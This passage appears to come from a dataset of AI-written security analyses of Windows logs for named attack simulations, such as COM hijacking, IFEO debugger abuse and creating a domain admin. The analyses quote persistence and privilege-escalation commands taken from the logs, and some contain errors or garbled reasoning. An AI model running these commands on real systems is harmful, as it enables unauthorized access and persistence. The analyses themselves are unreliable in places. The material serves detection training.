2. **Process Execution Context:**
   - There is a notable presence of `cmd.exe` calling several processes (`netsh.exe`, `notepad.exe`) within a very short timeframe. These rapid-fire executions suggest a script or automated task might be running, which is often characteristic of a malicious script or an attacker’s manual activity.
   - The use of `wevtutil.exe` multiple times could indicate an attempt to query event logs or clear them—a behavior that is sometimes observed in attackers covering their tracks.

3. **Software Updates and Execution:**
   - There are multiple log entries related to Microsoft Edge Updates, which frequently interact with EdgeUpdate services and temporary directories. While these may be legitimate updates, the timing and rapid succession of executions (especially from temporary directories) warrant closer investigation to rule out exploitation of these processes.

### Assessment:

The activity highlighted, particularly the manipulation of network settings via `netsh.exe` and the execution of potentially suspicious command line sequences, raises concerns. These actions, along with the rapid process creation and termination, suggest that further investigation is required to determine if they are part of regular administrative tasks or something nefarious.

### Resolution:

Based on the analysis, the logs contain activity that exhibits characteristics typically associated with suspicious or potentially malicious behavior, such as rapid sequence process execution, use of temporary directories, and network configuration changes.

**Resolution: SUSPICIOUS** - The activities noted require further investigation to ascertain their legitimacy. It is recommended to:
- Conduct a forensic analysis of involved files and directories.
- Review and cross-reference with other logs/policies for legitimate scheduled tasks or updates.
- Ensure user `SERVER002\admin_test` was executing known administrative scripts or tasks.
- Evaluate any network configuration changes and validate the absence of unauthorized access.

Further engagement with the user or administrator involved and reviewing additional network and endpoint logs should follow to confirm or refute the suspicion."
Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,"### Detailed Log Analysis

#### System Log Analysis
- The system log entries mainly indicate time change events handled by `svchost.exe`, which is normal for Windows time synchronization operations, especially when interacting with NTP servers like `time.windows.com`. The time change events do not appear malicious by themselves.

#### Sysmon Log Analysis
- Several instances of `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `HOSTNAME.EXE` are recorded. These are standard Windows utilities, and their execution alone isn't inherently malicious. The logs show these processes being executed by the user `admin_test` with a high integrity level, which implies the user has administrative privileges.
- A `cmd.exe` process is observed with suspicious command-line arguments involving registry modifications. A registry key (`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test`) is being created and manipulated. This behavior is often associated with persistence mechanisms used by malware to remain on a system or to execute during a certain event. 
- `atbroker.exe` is executed with the command line `/start malware_test`, indicating an attempt to utilize the modified registry entry, potentially to execute elevated or continuous malware tasks.

#### Application Log Analysis
- A benign log entry related to the Software Protection Platform Service, indicating routine checks, was observed.

#### Security Log Analysis
- Events related to time changes confirm the actions observed in the system log. These actions originate from `svchost.exe` running under the `LOCAL SERVICE` account, consistent with normal system time synchronization.

### Assessment
Several key indicators suggest potential malicious activity:
1. **Registry Modifications**: The `cmd.exe` process executes commands that could establish a persistence mechanism via the registry with a suspiciously named entry (`malware_test`).
2. **Process Execution Chain**: Execution of command-line utilities (`cmd.exe`, `reg.exe`) with commands that modify the registry, often a technique used by malware for persistent execution or configuration.

### Guidance on How to Proceed
- **Immediate Incident Response**: It would be prudent to immediately isolate the affected system (`Server002`) to prevent potential spread or additional harm. Investigate what triggered these registry modifications.
- **Forensic Analysis**: Perform a detailed forensic analysis on `Server002` to determine the source and scope of the entire compromise.
- **User and Process Monitoring**: Implement enhanced logging and monitoring for activities performed by `admin_test` and any related processes to catch further malicious behaviors.
- **Registry Clean-Up**: Consider cleaning up or rolling back suspicious registry changes to prevent unauthorized software from using these keys.

### Resolution
The presence of command-line activities modifying the registry suspiciously supports a conclusion of **MALICIOUS** activity. The logs strongly indicate an attempt to establish persistence with potential malware testing or deployment."
COM hijacking via TreatAs,"Upon analyzing the provided logs, several events stand out as potentially suspicious and indicative of malicious activity:

### Analysis of Suspicious Activity
1. **PowerShell Script Execution:** 
   - The logs show the execution of a PowerShell script with a series of `reg add` commands targeting the `HKEY_CURRENT_USER\SOFTWARE\Classes` registry hive. 
   - Entries are registered for a CLSID with a GUID `{00000001-0000-0000-0000-0000FEEDACDC}` and are associated with a file at `C:\WINDOWS\system32\scrobj.dll` and a URL pointing to a potentially malicious scriptlet hosted on GitHub (e.g., `TreatAs.sct`).
   - The scriptlet URL configured in the registry could potentially allow for execution of remote malicious code.

2. **Execution of `rundll32.exe`:**
   - Following the registry modifications, there is an execution of `rundll32.exe` to load a library associated with the newly added registry keys. 
   - `rundll32.exe` is often used by attackers to execute code via DLLs.

3. **Sysmon Events:**
   - Multiple instances of registry modification operations (invoked via `reg.exe`) and PowerShell scripts are logged, indicating tampering with Windows registry settings potentially for persistence or code execution.
   - The community's known tactics involve such persistence mechanisms to evade detection by using registry misconfigurations and executing scripts upon trigger.

4. **No Other Benign Activities Correlate:**
   - The events surrounding the PowerShell and `rundll32.exe` usage do not align with regular activities logged within the given timeframe, such as Windows updates or system scans.

5. **Absence of Legitimate Triggers:**
   - The involvement of `rundll32.exe` and the specific registry entries associated with what appears to be a placeholder `fileTest` registry entry strongly suggest an attempt to masquerade malicious activity under legitimate system processes.

### Assessment
Based on the patterns of registry manipulation, potential remote code execution via scriptlets, and misuse of system utilities, this activity is unequivocally indicative of a security breach or attempted compromise.

### Resolution
- **Resolution: MALICIOUS**  
The activity captured in the logs shows clear signs of malicious intent, with potential code execution through registry tampering and the use of `rundll32.exe`. Immediate action should be taken to contain the threat.

### Guidance on How to Proceed
1. **Isolate the Host:** Disconnect `Server002` from the network to prevent further remote access or data exfiltration.
2. **Conduct a Detailed Forensic Analysis:** Investigate the server for further indicators of compromise, including unauthorized user accounts or additional backdoors.
3. **Review and Clean Registry Entries:** Remove any unauthorized registry entries, especially those associated with suspicious GUIDs and URLs.
4. **Implement Threat Intelligence:** Use the available indicators from this incident (such as the scriptlet URL) to update security tools and block any further attempts.
5. **Monitor Closely for Re-Occurrence:** Increase monitoring to detect early signs of similar activities in the future.
6. **Inform and Consult with Incident Response:** Notify your incident response team and engage them for containment, eradication, and recovery activities.

By addressing these indicators of compromise promptly, the organization can mitigate potential damage and fortify defenses against similar future threats."
Adding custom debugger for Windows Error Reporting,"Upon reviewing the given event logs, I have analyzed the System, Sysmon, Security, and Application logs for any signs of malicious activity or compromise. Here’s a detailed breakdown of findings:

### System Log:
- **Time Synchronization Events**: The logs show several entries related to time changes executed by `svchost.exe`, which is a legitimate system process. These events are typically benign, relating to time synchronization adjustments (`EventID 1` and `24`), which are normal for system operations.

### Sysmon Log:
- **Process Executions**: 
  - **`hostname.exe`, `whoami.exe`, `cmd.exe` and `wevtutil.exe`**: These programs are executed frequently. `whoami.exe` and `hostname.exe` are harmless commands to check user and computer names. However, frequent executions might indicate scripted operations, though not inherently malicious.

  - **`cmd.exe` and Registry Change**: Notably, there’s a `cmd.exe` executed with a command to add a debugger for Windows Error Reporting through `reg.exe`. This action, while not necessarily malicious, could be suspect as it modifies the registry, potentially indicating an attempt to hijack error reporting for persistence or debugging.

### Security Log:
- **Time Change**: The security log reflects the same pattern as the system log concerning time change events initiated by `svchost.exe`; logged under `EventID 4616`. It supports the conclusion that these are standard operations.

### Application Log:
- **SPP Event**: No unusual activity observed. The log pertains to a typical Software Protection Platform service running, logged under `EventID 16384`.

### Assessment:
The log entries suggest mostly benign activity consistent with routine system operations. The noteworthy action is the execution of a command-line that modifies registry settings using `cmd.exe` and `reg.exe`, which could be an automation script executing a configuration change or an attempt at persistence by a malicious actor. The presence of typical ADMIN_~1 paths and a straightforward command format suggests possible automated machine upkeep rather than human-driven attack actions.

### Conclusion:
- **Resolution: SUSPICIOUS**
  - While there are no direct indicators of compromise (IoCs) of overtly malicious activities, the registry modification is unusual and warrants further investigation. Specifically, reviewing changes to the registry for unauthorized modifiers or maintenance tasks would clarify this suspicious activity.
- **Guidance**:
  - **Investigate Registry Modifications**: Validate the intent behind the registry change and whether it’s part of routine maintenance procedures.
  - **User and Script Verification**: Check if the actions performed by `SERVER002\\admin_test` are routine or warranted by system admin procedures to ensure they are legitimate.

Should further anomalies be detected in conjunction, escalate to more thorough threat-hunting procedures or reviews of system activity history."
Powershell Execute COM Object,"Based on the logs provided, there are several indicators of potentially malicious activity. Here are the key observations:

1. **Security Log - Event ID 4624 (Successful Logon):**
   - The account 'admin_test' logged on using NTLM authentication from a workstation named 'DESKTOP-3HL5B2P' with an IPv6 address and an IPv4 address '192.168.0.102'. The use of NTLM (especially NTLMv2) over the network might not be inherently malicious, but in a secured environment, it could be an indicator of pass-the-hash attacks or credential theft, especially if other, more secure authentication protocols are available.

2. **Security Log - Event ID 4672 (Special Privileges Assigned):**
   - The 'admin_test' account was granted a set of high privileges, including SeDebugPrivilege, SeTakeOwnershipPrivilege, and SeLoadDriverPrivilege. Such privileges are usually necessary for certain administrative tasks, but their presence, especially if unexpected, can suggest attempted privilege escalation or preparation for lateral movement within the network.

3. **Sysmon Log & PowerShell Usage:**
   - The execution of a PowerShell script that creates an instance and uses a ShellExecute method to invoke 'cmd.exe' with the '/c calc.exe' command. This suggests an unusual attempt to leverage PowerShell for command execution, which is a common tactic used in various forms of malware and penetration testing to execute code or commands within the context of a legitimate process.

4. **Frequent Use of Sysinternals Utilities:**
   - Particularly, 'wevtutil.exe' and 'conhost.exe' processes were seen in multiple Sysmon entries. While these, in isolation, are not necessarily malicious, their repeated and possibly concurrent execution raises suspicion, especially in the context of other PowerShell scripts and administrative privileges being utilized.

5. **Time Discrepancies:**
   - The Security and System logs show events around time changes (Event ID 4616), which could indicate attempts to manipulate system time as a tactic for evading temporal-based detection mechanisms or simply a side-effect of other activities.

6. **Process Execution (whoami.exe, hostname.exe, conhost.exe):**
   - These processes, while legitimate, when executed repeatedly or in specific sequences like seen here, can be part of a reconnaissance phase in a compromise.

**Assessment:**
Based on the above points, the activities recorded in the logs are indicative of an intrusion methodology where a legitimate user's credentials may have been compromised, leading to potentially unauthorized actions that include privilege escalation, reconnaissance, and execution of commands via PowerShell.

**Resolution: MALICIOUS**
Given the use of advanced administrative privileges, NTLM authentication from a detachable network, and potential misuse of PowerShell, it is very plausible that these logs reflect malicious activity. Immediate steps should involve:
- Promptly investigating and verifying the legitimacy of the user account 'admin_test' and actions related to it.
- Reviewing recent changes and running systems for signs of backdoors or malware.
- Examining network traffic patterns surrounding the logged event times.
- Enforcing enhanced authentication methods and reducing reliance on NTLM if possible.
- Increasing logging around privileged activities and PowerShell script executions.

Continuing further investigation with a particular focus on validating user actions and potential lateral movements within the network is crucial."
Registry key creation and-or modification events for SDB,"### Detailed Analysis of the Logs

#### Application Logs
- **EdgeUpdate Service Stopped**: The repeated stopping of the ""edgeupdate"" service is logged twice but appears normal for routine operation or maintenance processes without further suspicious context.

#### System Logs
- **Time Changes**: Entries indicate changes in the system time which can be part of regular sync activities. The changes are carried out by `svchost.exe`, a typical process for such an operation.
- **Time Service and Kernel-General Entries**: Reflect regular time adjustments using external time sources like `time.windows.com` without indications of tampering.

#### Sysmon Logs
- **Process Executions**:
  - **System Processes**:
    - `svchost.exe`, `wsmprovhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `conhost.exe` executions show regular operations without irregular command-line arguments or privilege changes.
  - **Microsoft Edge Update**:
    - Many entries related to `MicrosoftEdgeUpdate.exe` and its related processes show version updates and installations reflecting routine software updating, without abnormal command-line flags or paths.
- **Powershell Execution**:
  - The command sets registry keys under `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\`. This operation could be suspect if it modifies compatibility layers without known reason and is executed from `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`.

#### PowerShell Logs
- **Suspect PowerShell Activity**:
  - The PowerShell command attempts to set registry properties - potentially harmless if part of a legitimate application update or configuration but merits cautious approach to verify authenticity and intent. Requires confirmation that this activity is expected by an authorized admin or application.

#### Security Logs
- **Privilege Use**:
  - The user `admin_test` executed with several administrative privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc. These are typical for legitimate admin actions but high privileges must be verified to ensure authorized use.
- **NTLM Logon**:
  - The logon activity indicates a remote NTLM authentication from `DESKTOP-3HL5B2P` to `Server002` without any direct indications of failed access attempts or suspicious source.

### Assessment and Resolution
- **BENIGN to SUSPICIOUS**: The logs predominantly reflect normal operations such as software updates, system time adjustments, and common system activities. However, the PowerShell activity modifying registry settings requires additional verification due to the potential misuse in unauthorized modifications. Consequently, the outcome leans towards **SUSPICIOUS** as it may need further investigation.

### Guidance on How to Proceed
1. **Verify PowerShell Command**: Investigate the rationale behind the registry changes executed via PowerShell and ensure it is an expected action by a specific admin or automated task.
2. **Confirm Administrative Intent**: Validate the purpose and legitimacy of the `admin_test` account's activities, especially those involving elevated privileges.
3. **Check for Consistency**: Review if similar activity patterns occur regularly under authorized conditions.
4. **Monitor Subsequent Logs**: Remain vigilant to the recurrence of this PowerShell execution and any other registry manipulation without known maintenance or installation plans."
Create a new Windows domain admin user,"Upon reviewing the provided Windows event logs, several entries warrant attention due to their potential implications for system security. Here's a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Time Change Events**:
   - **Kernel-General EventID 1** and **Security-Auditing EventID 4616** indicate a time change, which is orchestrated by `svchost.exe`. Such adjustments, especially without notice, could be used to manipulate log timestamps to cover tracks.

2. **Privileged Account Activities**:
   - **Security-Auditing EventID 4672**: The user `admin_test` has numerous advanced privileges (e.g., SeDebugPrivilege, SeBackupPrivilege). This typically suggests administrative operations or possible elevation activities.
  
3. **Command Execution for User and Group Manipulation**:
   - **Sysmon EventID 1**: A `cmd.exe` process created a user (`data.002_Admin`) and added this user to the `Domain Admins` group. This action is highly suspicious and indicative of privilege escalation:
     - `""cmd.exe"" /c net user ""data.002_Admin"" ""data_pass123!"" /add /domain & net group ""Domain Admins"" ""data.002_Admin"" /add /domain`
   - This command is a clear indicator of compromise, possibly indicating a phase of post-intrusion lateral movement aiming at expanding control over the network.

4. **Excessive Execution of System Utilities**:
   - Frequent execution of system utilities like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` within a very short period, particularly under `admin_test`, could hint at reconnaissance or privilege checks.

5. **Microsoft Edge Updates**:
   - Several events showing legitimate Microsoft Edge updates do not pose suspicion inherently. However, they remain background noise during this investigation.

### Assessment:

- The entries demonstrating user and group creation via command-line scripting indicate unauthorized access and activity, fitting a typical pattern of Mimikatz exploitation or similar attack frameworks used in compromising domain controls.
  
- The continuity of `admin_test` executing privileged commands and potentially probing the system could suggest either compromised credentials or malicious insider threats.

### Resolution:

- **MALICIOUS:** The logs clearly show activities that suggest an attempt to escalate privileges and potentially take control of domain accounts. Such vendor logs combined with ethereal command executions liken themselves to a sophisticated attack or security breach.

### Guidance on How to Proceed:

1. **Immediate Isolation**:
   - Isolate `Server002` from the network to prevent further exploitation or data exfiltration.

2. **Credential Audits**:
   - Investigate the legitimacy of the `admin_test` account and its credentials.
   - Check for the presence of the newly-created `data.002_Admin` user on all domain controllers and servers.

3. **Sweep for Tools**:
   - Conduct a thorough search for common malicious tools like Mimikatz.
   
4. **Root Cause Analysis**:
   - Identify the source of the compromise that escalated privileges. This might involve looking into vulnerable applications or misconfigurations that allowed the breach.

5. **Event Logging Review**:
   - Enhance event logging parameters to flag privilege misuse and user creation commands.

6. **Reinforce Security Protocols**:
   - Enforce multi-factor authentication for privileged accounts and revise password policies.

7. **Engage Incident Response**:
   - Invoke a full incident response team to manage communications, containment, and potential legal/regulatory repercussions.

By undertaking these strategic responses, you will reduce the risk posed by this breach and bolster your defense against future incidents."
HKLM - Persistence using CommandProcessor AutoRun key (With Elevation),"Based on a detailed examination of the provided event logs, the following analysis and assessment of each log type is outlined below:

### Application Log
- **edgeupdate Events**: The log shows multiple instances of the `edgeupdate` service stopping. This may indicate a failed update or a configuration issue if it's unexpected but can also be a normal part of the update cycle.
- **Security-SPP Event**: Indicates standard operation of the Software Protection Platform Service.

### Sysmon Log
- **whoami and HOSTNAME Executions**: The execution of `whoami.exe` and `hostname.exe` are common for identifying user and system information. These are benign if used by an administrator but could be suspicious in certain contexts if there is no reason for these processes to be run.
- **PowerShell Execution**: The PowerShell command `New-ItemProperty` to set `AutoRun` with `notepad.exe` is highly suspicious. This is indicative of persistence tactics where an attacker tries to ensure that `notepad.exe` (or another payload) runs automatically.
- **Microsoft Edge Update Activity**: Many logs show update activities related to Microsoft Edge. The majority of these seem to be updates performed by the Microsoft Edge Update service, which is legitimate. However, any unexpected usage of these processes warrants further investigation.

### Windows PowerShell Log
- The PowerShell logs confirm the execution of a script that modifies registry settings to add an `AutoRun` task. This action is particularly suspicious and indicative of persistence mechanisms often used by malicious entities.

### Security Log
- Exhibits time change events which may be part of a normal NTP synchronization process, but inconsistent or unexpected time changes can be used to evade detection mechanisms or hide malicious activity timestamps.

### System Log
- Contains records of time change events, likely coinciding with those in the security log. This also seems consistent with routine operations unless correlated with other suspicious activity.

### Summary
- The main concern revolves around the PowerShell command intended to alter the auto-run configuration, hinting at a possible attempt to persist a malicious script or executable. This aligns with the technique known as ""AutoRun"" used by attackers for persistence.
- Other events, such as the execution of normal Windows utilities like `whoami.exe` and service updates like those related to `edgeupdate`, generally appear to be benign but must always be considered in context to what is normal for the environment.

### Assessment & Resolution
Based on the presence of suspicious PowerShell activity intending to modify the Windows registry for persistence, the resolution is:

- **Resolution: MALICIOUS**

### Guidance on How to Proceed
1. **Investigate Registry Changes**: Immediately inspect the system registry for unauthorized AutoRun entries and remove any that seem suspicious.
2. **Check for Additional Persistence Mechanisms**: Beyond the registry, check other common persistence points and scheduled tasks.
3. **Conduct a Full System Malware Scan**: Run a comprehensive antivirus/antimalware scan.
4. **Review Access Logs**: Check access logs around the time these PowerShell activity occurred to identify potential unauthorized access or lateral movement.
5. **Isolate and Remediate**: If any malicious persistence mechanisms are confirmed, isolate the host and remediate accordingly.
6. **User Awareness**: Inform affected users about the potential security incident and reinforce security best practices.

Consider an in-depth threat hunt and forensic analysis to fully understand the scope of the potential compromise."
Change Default File Association,"Upon reviewing the provided logs from the Sysmon Operational channel and the Application log of Server002, here are the detailed observations:

### Sysmon Log Observations:

1. **Common Process Executions**: 
   - Several processes for the Microsoft Edge update are being executed repetitively. This is noted with processes such as `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`. Furthermore, different Microsoft-related applications like `TiWorker.exe` and `TrustedInstaller.exe` are executed, which are typically benign and related to system updates.

2. **Significant Operations**:
   - The use of `wevtutil.exe` and other administrative utilities such as `whoami.exe` and `HOSTNAME.EXE` by a user account (`SERVER002\\admin_test`) might suggest maintenance activities or scheduled tasks. However, these utilities are often used for Windows administrative functionalities and typically run by users with administrative roles.
   
3. **Process Launch by High Integrity Level**:
   - Common Windows applications like `cmd.exe` were also executed with parameters (`assoc .hta=txtfile`) that appear to modify file associations. This could be suspicious as it alters how file types are handled by the system. This action should be scrutinized further to understand its intent if unexpected.

4. **Unexpected Use of Command Line Tools**: 
   - The repeated execution and association change using `cmd.exe` is something to pay attention to, especially if this behavior is new or unaccounted for in routine system operations.

5. **Environmental Utilities**:
   - The use of `conhost.exe`, which frequently accompanies console applications, suggests interactive or automated script execution, where console sessions are invoked. Again, this is expected but should be double-checked against usual activity patterns.

### Application Log Observations:

- **Edge Update Service**: 
  - An event clearly states ""Service stopped"" for `edgeupdate` service. This could mean a legitimate service shutdown or require further inspection if this corresponds with any service disruption reports.

### Conclusion and Recommendation:

- **Assessment**: Based on the logs provided, there are actions that are potentially **SUSPICIOUS**. The use of administrative tools by a user account (`SERVER002\\admin_test`), coupled with a command modifying file associations (.hta files), and utilities running with high integrity, warrant further investigation to confirm the current operational norms on this server.
  
- **Resolution**: SUSPICIOUS

### Next Steps:

1. **Verify User Activity**: Clarify if user `admin_test` was performing known administrative functions or system maintenance.

2. **Review Recent Changes**: Investigate change logs or maintenance schedules to verify if recent modifications were planned or documented.

3. **Inspect Command Usage**: Confirm the legitimacy and context of the command modifying file associations using `cmd.exe`.

4. **Threat Hunt**: Carry out a threat hunt for any signs of malicious scripts or intrusions corresponding to the observed activities.

5. **Validation**: Cross-reference these findings against other logs, including network activity, to further understand the context of these operations."
Install Outlook Home Page Persistence,"Upon analyzing the provided logs, we need to discern any suspicious activity that could indicate potential malicious behavior.

### System Logs:
- Notably, there are multiple events related to time adjustment:
  - Event ID 1 from the Kernel-General, and Event ID 4616 from Security-Auditing indicating time change. The changes in the system time are typically benign and relate to system updates and maintenance. However, unprompted changes especially if frequent or unscheduled could also indicate attempts at time manipulation for malicious purposes. However, in this dataset, it appears to be routine maintenance considering the provider and user.

### Security Logs:
- Event ID 4616 is a security audit success related to system time changes, consistent with the system logs, performed by 'LOCAL SERVICE'. This behavior does not seem to indicate any malicious intent as this falls within regular system behavior.

### Sysmon Logs:
- Multiple processes like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and registry modification using `reg.exe` were run by the user `SERVER002\admin_test`. 
- The use of `cmd.exe` to run a registry modification command to add a URL to the Outlook WebView could be potentially malicious:
  - Executed Command: `""cmd.exe"" /c reg.exe add HKCU\Software\Microsoft\Office\16\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\data.004.html /f`.
  - This command modifies a registry key for Outlook WebView with a local HTML file, which might be a vector for a phishing attack or another type of payload execution.

### Conclusion:
The behavior observed in the Sysmon logs, especially with the registry modification command involving `cmd.exe` and `reg.exe`, is suspicious. Given that there is a registry modification towards an Outlook WebView URL pointing to a local HTML file, this could potentially be used for leveraging a phishing attack or delivering malware. Therefore, this behavior needs further investigation to ensure whether the registry modification is authorized and part of legitimate network activities.

### Resolution:
- **SUSPICIOUS**: The logs contain activities that do not align completely with benign system operations and should be further investigated, particularly focusing on the legitimacy of the registry changes involving the Outlook WebView.

### Recommended Actions:
1. Confirm the authorization for these registry changes, particularly focusing on user intent and the source HTML's integrity and purpose.
2. Conduct a deeper investigation into any other activities related to the user `SERVER002\admin_test`.
3. Scan the machine with updated security tools to ensure no malicious files have been dropped or executed.
4. Consider monitoring or restricting similar activities unless required for business purposes."
GlobalFlags in Image File Execution Options,"**Detailed Analysis:**

1. **System Log Analysis:**
   - The log entries mainly pertain to time adjustments and updates, as indicated by the `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service` providers. These adjustments appear to be related to time synchronization and are not typically indicative of malicious activity. The use of `svchost.exe` in these entries is standard as it hosts various system services.

2. **Application Log Analysis:**
   - The application log entries reference service stoppages by `edgeupdate`. This denotes that a service related to Microsoft Edge's update process was stopped. Stopping update services can occur during maintenance or updates and does not inherently suggest malicious actions. 

3. **Sysmon Log Analysis:**
   - A series of events involving legitimate processes (`hostname.exe`, `conhost.exe`, `wevtutil.exe`, `whoami.exe`) are noted, primarily executed by the user `SERVER002\admin_test`. The use of the `wevtutil.exe` process multiple times can be part of querying event logs or making administrative adjustments and isn't immediately suspicious without additional context.
   - A notable entry involves `powershell.exe` executing a script that alters registry entries under `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\whoami.exe`, redirecting the execution to launch `calc.exe` instead of `whoami.exe`. Creating registry entries to manipulate `Image File Execution Options` is commonly associated with persistence mechanisms or script testing but raising significant suspicion.
   - `whoami.exe` and `calc.exe` are not inherently malicious, but the redirection via PowerShell represents suspicious behavior, possibly indicative of an attempt to subvert standard process execution paths.

4. **Security Log Analysis:**
   - The security log indicates successful logon events with elevated privileges (`SeDebugPrivilege` and others) associated with the `SYSTEM` user, which is expected in a server environment but should be examined for context.
   - The `Advapi` logon process and privilege assignment align with typical service account behavior.

5. **Windows PowerShell Log Analysis:**
   - The PowerShell logs corroborate the Sysmon findings about registry alterations designed to direct `whoami.exe` to execute `calc.exe`. The script context indicates potential misuse for unauthorized tasks or as a test method for administrators.

**Assessment:**

- The alteration of registry entries via PowerShell to manipulate `Image File Execution Options` is a strong indicator of potentially malicious or unauthorized activity. This technique, especially altering process execution paths to run unintended applications, is suspect and requires further investigation.

**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct a thorough examination of user `SERVER002\admin_test` activities to verify whether the behavior was intentional and legitimate.
- Investigate the integrity of the systems performing the registry modifications and PowerShell execution to ensure they were not compromised.
- Review access permissions and consider restricting PowerShell actions and registry modifications unless necessary or performed by verified administrative users.
- Check for additional indicators of compromise and associated network or application events to gain full context on potential lateral movement or further persistence mechanisms.
- Alert relevant stakeholders to the potential unauthorized activities and take measures to secure the affected host."
Office Application Startup Test Persistence (HKCU),"Based on the provided Windows event logs, there are several indicators of potentially suspicious or anomalous behavior that warrant further investigation:

### PowerShell Logs Analysis:
1. **PowerShell Script Execution:** 
   - All the PowerShell events indicate that there is a PowerShell script executing a command involving the manipulation of the Windows Registry and the handling of Microsoft Word processes.
   - The script attempts to register DLLs depending on whether a 32-bit or 64-bit version of Microsoft Office is detected. This behavior involves:
     - **Registry Key Modification:** Adding DLL files (`officetest_x64.dll` and `officetest_x86.dll`) to the registry, altering application behavior.
     - **Process Termination and Start:** Stopping and starting `WinWord` (Microsoft Word) processes.
     - This behavior is suspicious as it may indicate an attempt to introduce malicious code into the Office environment to exploit vulnerabilities or gain persistence.

### Sysmon Logs Analysis:
1. **Process Creation:**
   - Numerous processes related to PowerShell, wevtutil.exe (Windows Event Log Utility), and conhost.exe (Console Window Host) are showing activity. While some `conhost.exe` activity can be benign, multiple sequential executions could indicate script or automated task execution.
   - **TrustedInstaller.exe** and **TiWorker.exe** are typical Windows processes related to updates, their presence is expected in routine operation, but should be confirmed if unexpected context or volume exist.
   - **PowerShell:** The presence of PowerShell execution in conjunction with registry changes indicates a potential compromise, especially since it is using registry operations to add DLLs.
   - **wevtutil.exe** Activity: Points to possible tampering with event logs, which is commonly used by attackers to cover tracks.

2. **WMI Provider Host and PowerShell:**
   - The Parent Process for several events is `wsmprovhost.exe`. WMI (Windows Management Instrumentation) Provider Host usage with PowerShell indicates potential automated task/script execution, commonly seen in lateral movement scenarios.

### Conclusion:
Given the registry edits executed by PowerShell without clear, legitimate purposes and the commandlines showing registry modification with DLL additions, this set of logs suggests potentially **malicious activity**. The activity fits patterns associated with lateral movement, persistence mechanism introduction, or malware execution, including suspicions around the modification of system behavior (DLL injection via registry keys).

### Resolution:
- **MALICIOUS:** The logs contain activity indicating a high likelihood of malicious intent, specifically through registry manipulation, script execution for component registration, and process manipulation.
  
### Recommendations:
- **Immediate containment**: Isolate the affected host to prevent further potential spread of malicious activity.
- **Comprehensive malware scan**: Conduct a full malware scan focusing on tools capable of identifying and removing complex threats.
- **Registry and System Integrity Verification**: Verify the integrity of registry settings and critical system files.
- **Security Auditing**: Enable enhanced logging and auditing on PowerShell and other frequently abused system utilities.
- **Incident Response**: Engage in a structured incident response, collecting forensic evidence if needed for a deeper investigation, and review network activities for similar anomalies on other systems.
- **User Awareness and Training**: Educate users about the risks associated with downloading unknown files or executing unauthorized scripts. 

Implementing these actions will help mitigate potential threats and prepare for any future occurrences related to such malicious activities."
Install IIS Module using AppCmd.exe,"After analyzing the provided logs, here is a detailed assessment of the situation:

**Indicators of Suspicious Activity:**

1. **Command-Line Executions:**
   - There's an instance of `cmd.exe` executed with a command line to install a module using `appcmd.exe`. This usage could be considered suspicious if unexpected modules are being installed or if this action was not authorized, especially when executed by a user account with elevated privileges.
   - The PowerShell execution noted in the log seems to involve basic operations without overtly malicious commands. However, PowerShell is often used for executing scripts maliciously, so contextual analysis or further investigation could be warranted if unexpected behavior is observed.

2. **Frequent Process Executions:**
   - There are numerous invocations of the `MicrosoftEdgeUpdate.exe` process with various commands related to its update mechanisms (`/svc`, `/c`, `/ping`). While updates are normal for any software, the frequency and variations in command usage could be worth investigating to confirm they are part of standard update operations and not being exploited for other purposes.

3. **Wevtutil Executions:**
   - Executes log operations repeatedly via `wevtutil.exe`. While this can be normal for system management and maintenance, frequent manipulation of event logs might suggest attempts to clear traces of potentially unwanted activities.

4. **Service Stopping:**
   - Logs indicate that the `edgeupdate` service stopped multiple times in quick succession. This might be typical behavior during an update cycle, but it could also suggest tampering or malfunction when accompanied by failures or alerts.

**Assessment:**
- The activities involving legitimate executables like `MicrosoftEdgeUpdate.exe`, `cmd.exe`, and `wevtutil.exe`, while common, could be utilized by malicious actors in the context of system maintenance or to cover tracks. However, given there's no overt sign of unauthorized access or known malicious execution scripts visible within the logs, it's challenging to definitively label these actions as malicious without further context or corroborating alerts.
  
**Guidance on Further Steps:**
1. **Validation of Updates:**
   - Verify the legitimacy of the Microsoft Edge updates to ensure they originate from trusted sources.
  
2. **User Session Verification:**
   - Check the activity surrounding the `admin_test` user account to confirm whether these interactions align with known administrative tasks or if there's potential account misuse.

3. **Review of Unexpected Process:**
   - Evaluate recent installation and configuration changes around the period in question to determine any deviations from expected behavior, particularly involving installing or configuring modules not previously sanctioned.

4. **Check Anti-Malware Logs:**
   - If available, review endpoint protection and anti-malware solutions for any detections or interventions that match up with the timeline of these events.

**Resolution:**
Given the nature of the events and the potential for benign explanations, the most prudent resolution at this stage is:

- **SUSPICIOUS:** The activities require a closer examination and validation of intentions, as they could be substantiated with legitimate reason upon check or may reveal deeper issues upon investigation. Further scrutiny is recommended, especially concerning system and network integrity checks, to rule out any potential threats."
Attaches Command Prompt as a Debugger to a List of Target Processes,"### Detailed Analysis of Logs:

#### Security and System Logs:
1. **Event ID 4616**: Multiple entries show the time change using `svchost.exe`. This is benign as it might be related to regular time synchronization activities with a time server (`time.windows.com`). The consistent referencing of the LOCAL SERVICE account confirms this is a system-level operation.

2. **Event ID 4624 & 4672**: These indicate a SYSTEM logon and special privileges assigned. SYSTEM logins (`LogonType 5`) are standard and often seen with legitimate services or scheduled tasks performing automated tasks under the SYSTEM context. The multitude of privileges seen is typical for SYSTEM usage.

#### Application Logs:
1. **Windows Defender**: Consistent logs of Windows Defender being active (`SECURITY_PRODUCT_STATE_ON`) suggest protective measures are active, reducing the likelihood of a successful intrusion.

2. **edgeupdate Service**: A service associated with Microsoft Edge updates stops and starts. This is regular maintenance; Microsoft Edge updates typically utilize such processes.

